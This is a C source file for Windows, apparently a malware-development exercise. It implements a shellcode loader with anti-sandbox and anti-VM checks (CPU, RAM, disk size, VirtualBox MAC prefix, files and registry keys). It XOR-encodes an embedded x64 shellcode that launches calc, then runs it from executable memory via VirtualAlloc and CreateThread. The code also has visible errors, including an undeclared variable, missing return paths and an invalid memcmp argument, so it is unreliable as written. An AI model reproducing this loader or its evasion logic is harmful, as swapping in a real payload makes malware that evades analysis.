#ifndef UNICODE
#define UNICODE
#endif

#include <windows.h>
#include <stdio.h>

// Macros for printing status messages with different prefixes
#define printStatus(prefix, msg, ...) printf(prefix " " msg "\n", ##__VA_ARGS__)

#define SUCC(msg, ...) printStatus("[+] ", msg, ##__VA_ARGS__)
#define ERR(msg, ...) printStatus("[-] ", msg, ##__VA_ARGS__)
#define INFO(msg, ...) printStatus("[*] ", msg, ##__VA_ARGS__)

bool checkResources(void) {
    /* === Before doing anything, check if in a sandbox === */
    /* Check CPU */
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numProcessors = systemInfo.dwNumberOfProcessors;
    if (numProcessors < 2) {
        return false;
    }

    /* Checks RAM */
    MEMORYSTATUSEX memStat;
    memStat.dwLength = sizeof(memStat);
    GlobalMemoryStatusEx(&memStat);
    DWORD RAM_BYTES = memoryStatus.ullTotalPhys / 1024 / 1024; /* Get num bytes */
    if (RAM_BYTES < 2048) { /* Less than 2GB of RAM */
        return false;
    }

    /* Check if more than 100GB of storage  */
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) {
        return false;
    }

    return true;
}

bool checkNetAdaptors(void) {
    /* Check MAC address of the system against a list of known values */
    DWORD adaptersListSize = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &adaptersListSize);
    IP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);
    if (pAdaptersAddresses)
    {
    	GetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &adaptersListSize);
    	char mac[6] = { 0 };
    	while (pAdaptersAddresses)
    	{
    		if (pAdaptersAddresses->PhysicalAddressLength == 6)
    		{
    			memcpy(mac, pAdaptersAddresses->PhysicalAddress, 6);
    			if (!memcmp({ "\x08\x00\x27" }, mac, 3)) return false;
    		}
    	pAdaptersAddresses = pAdaptersAddresses->Next;
    	}
    }
}

bool checkVMartifacts(void) {
    // check files
    WIN32_FIND_DATAW findFileData;
    if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

    // check registry key
    HKEY hkResult;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS) return false;
}

int main() {
    if (!checkResources() or !checkNetAdaptors() or !checkVMartifacts()) {
        return EXIT_FAILURE;
    }

    /* XOR encoded shellcode to pop calc */
    unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";
    size_t shellcode_size = sizeof(shellcode);

    /* XOR encode payload */
    for (int i = 0; i < shellcode_size; i++) {
        ((char*)shellcode)[i] = (((char*)shellcode)[i]) ^ '\x33';
    }

    /* Allocate chunk of memory to load shellcode into */
    PVOID shellcode_memory = VirtualAlloc(0, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    /* Copy prepped buffer into memory */
    RtlCopyMemory(shellcode_memory, shellcode, shellcode_size);

    DWORD tID; // thread ID

    /* XOR Decode payload after it's in memory */
    for (int i = 0; i < shellcode_size; i++) {
        ((char*)shellcode_memory)[i] = (((char*)shellcode_memory)[i]) ^ '\x33';
    }

    /* Create a handle for the running thread */
    HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_memory, NULL, 0, &tID);
	WaitForSingleObject(hThread, INFINITE);

    return EXIT_SUCCESS;
}